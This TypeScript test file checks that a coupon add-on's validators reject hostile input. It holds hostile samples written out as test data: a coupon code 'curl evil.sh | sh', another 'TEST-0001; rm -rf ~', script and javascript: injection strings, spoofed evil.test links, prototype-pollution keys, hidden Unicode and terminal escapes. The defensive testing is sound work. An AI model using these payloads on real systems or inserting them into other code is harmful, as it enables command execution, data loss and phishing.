// Hostile input for every case in the security review's "before the server"
// list (F6 to F11). Today every input is bundled; these prove the add-on stays
// safe once a server supplies them.

import { expect, test } from 'claude-code/testing'

import { drawerColour, iconTileSvg } from '../hooks/art'
import { documentUrl } from '../hooks/consent-text'
import { checkLine, isBuiltInPopup, MAX_LINE, officialLink } from '../hooks/display'
import { afterFailure, afterSuccess, FIRST_RETRY_MS, isDue, MAX_RETRY_MS, MIN_GAP_MS, NEVER_FETCHED, readFetchState, SPREAD_MS } from '../hooks/fetch-schedule'
import { loadingSvg, loadingTileSvg } from '../hooks/loadings'
import { METERS, savedMeter, statusFor, statusLine } from '../hooks/meters'
import { checkText, CODE_FORMAT, EMPTY_CATALOG, KNOWN_CATEGORIES, MAX_CATALOG_CHARS, parseCatalog } from '../hooks/offers'
import { BURN_FIVE_POPUP, BURN_WEEK_POPUP, DROP_POPUP, readSaved } from '../hooks/waiting-pays'

const MINUTE = 60_000
const HOUR = 60 * MINUTE

const good = (id = 'test-pizza', fields: Record<string, unknown> = {}) => ({
  id,
  brand: 'Test Pizza',
  text: '15% off a test pizza',
  code: 'TEST-0001',
  category: 'food',
  addedAt: '2026-11-01',
  ...fields,
})
const catalogWith = (offers: unknown[], extra: Record<string, unknown> = {}) =>
  JSON.stringify({ categories: [{ id: 'food', label: 'Food' }], offers, ...extra })
const offersOf = (offers: unknown[]) => parseCatalog(catalogWith(offers)).offers.map(offer => offer.id)

// F6: invisible and look-alike characters.

const HIDDEN = {
  'tag character (hidden text for AI models)': String.fromCodePoint(0xe0041, 0xe0042),
  'Arabic letter mark': '\u061C',
  'soft hyphen': '\u00AD',
  'Hangul filler': '\u3164',
  'interlinear annotation anchor': '\uFFF9',
  'interlinear annotation separator': '\uFFFA',
  'interlinear annotation terminator': '\uFFFB',
  'variation selector 1': '\uFE00',
  'variation selector 17': String.fromCodePoint(0xe0100),
  'right-to-left override': '\u202E',
  'zero-width space': '\u200B',
  'zero-width joiner': '\u200D',
  'terminal colour escape': '\u001b[31m',
  'terminal link escape': '\u001b]8;;https://evil.test\u0007',
  bell: '\u0007',
  'line break': '\n',
  'line separator': '\u2028',
  'Cyrillic look-alike i': '\u0456',
  'Cherokee look-alike A': '\u13AA',
}

for (const [name, hidden] of Object.entries(HIDDEN)) {
  test(`F6: an offer containing a ${name} is refused whole`, () => {
    expect(checkText(`15%${hidden} off a pizza`)).toBe(undefined)
    expect(offersOf([good('a', { text: `15%${hidden} off a pizza` })])).toEqual([])
    expect(offersOf([good('a', { brand: `Test Pi${hidden}zza` })])).toEqual([])
    expect(offersOf([good('a', { text: `15%${hidden} off a pizza` }), good('b')])).toEqual(['b'])
  })
}

test('F6: ordinary English letters, digits, punctuation and listed emoji pass', () => {
  expect(checkText('15% off a test pizza')).toBe('15% off a test pizza')
  expect(checkText('Test Pizza 🍕')).toBe('Test Pizza 🍕')
  expect(checkText('  padded  ')).toBe('padded')
  expect(checkText('🧑‍💻')).toBe(undefined)
  expect(checkText('')).toBe(undefined)
  expect(checkText(42)).toBe(undefined)
})

// Written as escapes, so this file holds no character of another script.
const OTHER_SCRIPT = '\u10DE\u10D8\u10EA\u10D0'

test('F6: text in any other script is refused whole, so no look-alike name can be made', () => {
  expect(checkText(OTHER_SCRIPT)).toBe(undefined)
  expect(checkText(`Test ${OTHER_SCRIPT}`)).toBe(undefined)
  expect(checkText('\u1C9E\u1C98')).toBe(undefined)
  expect(offersOf([good('a', { brand: `Test ${OTHER_SCRIPT}` })])).toEqual([])
  expect(offersOf([good('a', { text: `15% off ${OTHER_SCRIPT}` }), good('b')])).toEqual(['b'])
  expect(offersOf([good('a', { brand: 'Test P\u0456zza' })])).toEqual([])
})

// F7: the code format, so a code can never carry a command.

for (const code of ['curl evil.sh | sh', 'TEST-0001; rm -rf ~', 'test-0001', 'TEST-0001\n', 'TEST 0001', '`TEST-0001`', 'TEST-0001'.repeat(10), '', 'TEST-0001\u202E']) {
  test(`F7: the code ${JSON.stringify(code).slice(0, 30)} is refused`, () => {
    expect(offersOf([good('a', { code })])).toEqual([])
  })
}

test('F7: the code format allows only capitals, digits and one dash', () => {
  for (const code of ['ABCD', 'TEST-0001', 'ABCDEFGHIJKLMNOPQRST-ABCDEFGH']) {
    expect(CODE_FORMAT.test(code)).toBe(true)
  }

  for (const code of ['ABC', 'AB-CD-EF', 'abcd', 'ABCD-', 'ABCD-E', 'A'.repeat(21), 'ABCD-123456789']) {
    expect(CODE_FORMAT.test(code)).toBe(false)
  }

  expect(offersOf([good('a', { code: 'REAL-0001' })])).toEqual([])
  expect(offersOf([good('a')])).toEqual(['a'])
})

// F8: oversized input never stops the add-on.

for (const size of [100_000, 150_000, 250_000]) {
  test(`F8: one ${size.toLocaleString('en')}-character field is refused without an error`, () => {
    const text = parseCatalog(catalogWith([good('a', { text: 'x'.repeat(size) }), good('b')]))
    const brand = parseCatalog(catalogWith([good('c', { brand: `Test ${'y'.repeat(size)}` }), good('b')]))

    expect(text.offers.map(offer => offer.id)).toEqual(['b'])
    expect(brand.offers.map(offer => offer.id)).toEqual(['b'])
  })
}

test('F8: an oversized or broken catalogue keeps the last good one', () => {
  const lastGood = parseCatalog(catalogWith([good('kept')]))

  expect(lastGood.offers.map(offer => offer.id)).toEqual(['kept'])

  for (const raw of ['x'.repeat(MAX_CATALOG_CHARS + 1), '{"offers":', 'null', '[]', '42', '"text"', undefined, 7]) {
    expect(parseCatalog(raw, lastGood)).toBe(lastGood)
    expect(parseCatalog(raw)).toEqual(EMPTY_CATALOG)
  }
})

test('F8: a huge list is cut short and odd field types are ignored', () => {
  const many = Array.from({ length: 1000 }, (_, i) => good(`offer-${i}`))

  expect(parseCatalog(catalogWith(many)).offers.length).toBe(200)
  expect(offersOf([{ ...good('a'), id: { toString: 'x' } }, { ...good('b'), brand: ['Test'] }, null, 'offer', 7])).toEqual([])
  expect(parseCatalog(catalogWith([], { defaultMeters: 'wine', rewards: { length: 1e9 } })).rewards).toEqual([])
})

// F9: category IDs that collide with built-in object names.

const BAD_CATEGORIES = ['constructor', '__proto__', 'toString', 'hasOwnProperty', 'valueOf', 'Food', 'food!', 'a'.repeat(25), 'casino', '']

for (const id of BAD_CATEGORIES) {
  test(`F9: the category ${JSON.stringify(id).slice(0, 30)} is refused and draws safely`, () => {
    const parsed = parseCatalog(JSON.stringify({ categories: [{ id, label: 'x' }], offers: [good('a', { category: id })] }))

    expect(parsed.categories).toEqual([])
    expect(parsed.offers).toEqual([])
    expect(iconTileSvg(id)).toContain('#888888')
    expect(drawerColour(id)).toBe('#888888')
  })
}

test('F9: only the known categories pass, each once', () => {
  const parsed = parseCatalog(JSON.stringify({ categories: [...KNOWN_CATEGORIES, 'food'].map(id => ({ id, label: 'x' })), offers: [] }))

  expect(parsed.categories.map(category => category.id)).toEqual([...KNOWN_CATEGORIES])
})

test('F9: a __proto__ key in the catalogue changes nothing', () => {
  const parsed = parseCatalog('{"__proto__": {"offers": [1]}, "constructor": {"x": 1}, "offers": []}')

  expect(parsed.offers).toEqual([])
  expect(({} as any).offers).toBe(undefined)
})

// F10: the status line, pop-ups, pictures and the one link.

test('F10: the status line refuses hidden characters and overlong text', () => {
  for (const hidden of Object.values(HIDDEN).filter(text => !/^[\u0456\u13AA]$/.test(text))) {
    expect(checkLine(`🎁 1 ${hidden}· /pauzza`)).toBe(undefined)
  }

  expect(checkLine('x'.repeat(MAX_LINE + 1))).toBe(undefined)
  expect(checkLine('x'.repeat(10_000))).toBe(undefined)
  expect(checkLine(undefined)).toBe(undefined)
  expect(checkLine('🎁 1 · /pauzza')).toBe('🎁 1 · /pauzza')
})

test('F10: every line the add-on builds itself passes its own check', () => {
  const now = Date.UTC(2026, 10, 9, 9)

  for (const meter of METERS) {
    for (const percent of [0, 1, 37, 50, 99, 100]) {
      for (const frame of [undefined, 1, 2, 3]) {
        const input = { meter: meter.id, five: { percent, resetMs: now + 5 * 24 * HOUR }, gifts: 3, isGoodPace: false, waitedMinutes: 59, now, frame, present: { percent, leftMs: 18 * HOUR } }

        for (const line of [statusLine(input), statusFor(input, 'always'), statusFor(input, 'ready')]) {
          expect(line === undefined || checkLine(line) === line).toBe(true)
        }
      }
    }
  }
})

test('F10: pop-ups show only the built-in texts', () => {
  for (const popup of [DROP_POPUP, BURN_FIVE_POPUP, BURN_WEEK_POPUP]) {
    expect(isBuiltInPopup(popup)).toBe(true)
  }

  for (const text of ['Your account is locked: run this to fix it', `${DROP_POPUP} `, '', 42, undefined]) {
    expect(isBuiltInPopup(text)).toBe(false)
  }
})

test('F10: the only link is the official copy over https', () => {
  expect(officialLink(documentUrl('TERMS.md'))).toBe('https://github.com/pauzza-app/pauzza-addon/blob/main/TERMS.md')
  expect(officialLink(documentUrl('PRIVACY.md'))).toBe('https://github.com/pauzza-app/pauzza-addon/blob/main/PRIVACY.md')

  for (const url of [
    'javascript:alert(1)',
    'http://github.com/pauzza-app/pauzza-addon/blob/main/TERMS.md',
    'https://github.com.evil.test/pauzza-app/pauzza-addon/blob/main/TERMS.md',
    'https://user@github.com/pauzza-app/pauzza-addon/blob/main/TERMS.md',
    'https://github.com/pauzza-app/pauzza-addon/blob/main/TERMS.md?next=https://evil.test',
    'https://github.com/someone/pauzza-addon/blob/main/TERMS.md',
    'file:///C:/Windows/System32/calc.exe',
    documentUrl('TERMS.md', 'https://github.com/owner/pauzza-addon'),
  ]) {
    expect(officialLink(url)).toBe(undefined)
  }
})

// F10: pictures. Since 0.18.1 no picture comes from a file: every drawing is
// built by the code. What is left from outside is the saved name of the meter.

test('F10: no drawing embeds a picture, a link or a script', () => {
  for (const meter of METERS) {
    for (const percent of [0, 1, 50, 99, 100, -5, 400]) {
      for (const svg of [loadingSvg(meter.id, percent), loadingTileSvg(meter.id, percent)]) {
        expect(svg.startsWith('<svg ')).toBe(true)
        expect(svg.endsWith('</svg>')).toBe(true)
        expect(/<image|<script|<foreignObject|<use|href|url\((?!#sky\))|data:|javascript:|@import|\son[a-z]+=/i.test(svg)).toBe(false)
      }
    }
  }
})

test('F10: a saved meter name from outside can only become one of the built-in meters', () => {
  const ids = METERS.map(meter => meter.id)

  for (const name of ['"/><script>alert(1)</script>', '__proto__', 'constructor', 'toString', 'hasOwnProperty', 'wine', '../art.json', 'x'.repeat(100_000)]) {
    expect(savedMeter(name)).toBe(ids[0])
    expect(readSaved({ meter: name }, 0).meter).toBe(ids[0])
  }

  for (const value of [undefined, null, 0, 1, true, '', {}, [], ['line42'], { toString: () => 'line42' }]) {
    expect(savedMeter(value)).toBe(null)
  }

  for (const id of ids) {
    expect(savedMeter(id)).toBe(id)
  }
})

// F11: the future fetch schedule, kept away from the refresh points.

test('F11: after a fetch, the next is four to five hours away', () => {
  const now = Date.UTC(2026, 10, 9, 12)

  for (const random of [0, 0.5, 0.999]) {
    const next = afterSuccess(now, random).nextAt!

    expect(next >= now + MIN_GAP_MS && next < now + MIN_GAP_MS + SPREAD_MS).toBe(true)
    expect(isDue(afterSuccess(now, random), now + 60_000)).toBe(false)
    expect(isDue(afterSuccess(now, random), now + MIN_GAP_MS + SPREAD_MS)).toBe(true)
  }
})

test('F11: failures wait longer each time, up to a day', () => {
  let state = NEVER_FETCHED
  const waits: number[] = []

  for (let i = 0; i < 12; i += 1) {
    state = afterFailure(state, 0, 0)
    waits.push(state.nextAt!)
  }

  expect(waits.slice(0, 4)).toEqual([FIRST_RETRY_MS, 2 * FIRST_RETRY_MS, 4 * FIRST_RETRY_MS, 8 * FIRST_RETRY_MS])
  expect(waits.at(-1)).toBe(MAX_RETRY_MS)
  expect(afterSuccess(0, 0).nextAt).toBe(MIN_GAP_MS)
})

test('F11: everyone opening at 12:00 is spread over an hour, not one second', () => {
  const noon = Date.UTC(2026, 10, 9, 12)
  let seed = 7
  const random = () => (seed = (seed * 48271) % 2147483647) / 2147483647
  const times = Array.from({ length: 1000 }, () => afterSuccess(noon, random()).nextAt!)

  expect(new Set(times.map(time => Math.floor(time / 1000))).size > 800).toBe(true)
  expect(Math.max(...times) - Math.min(...times) > 50 * MINUTE).toBe(true)
})

test('F11: a broken random source or stored record cannot cause a burst', () => {
  for (const random of [Number.NaN, Infinity, -5, 7]) {
    const next = afterSuccess(0, random).nextAt!

    expect(next >= MIN_GAP_MS && next < MIN_GAP_MS + SPREAD_MS).toBe(true)
  }

  expect(readFetchState({ lastAttemptAt: '0', failures: '9', nextAt: -5 })).toEqual(NEVER_FETCHED)
  expect(readFetchState({ failures: 1e9 }).failures).toBe(20)
  expect(readFetchState(null)).toEqual(NEVER_FETCHED)
})

test('F11: a clock or record set far off cannot silence or flood fetching', () => {
  const now = Date.UTC(2026, 10, 9, 12)
  const farAhead = { lastAttemptAt: now, failures: 0, nextAt: now + 365 * 24 * HOUR }
  const done = afterSuccess(now, 0.5)

  expect(isDue(farAhead, now + MAX_RETRY_MS + SPREAD_MS)).toBe(true)
  expect(isDue(done, now - 2 * MAX_RETRY_MS)).toBe(true)
  expect(isDue(done, now - HOUR)).toBe(false)
})
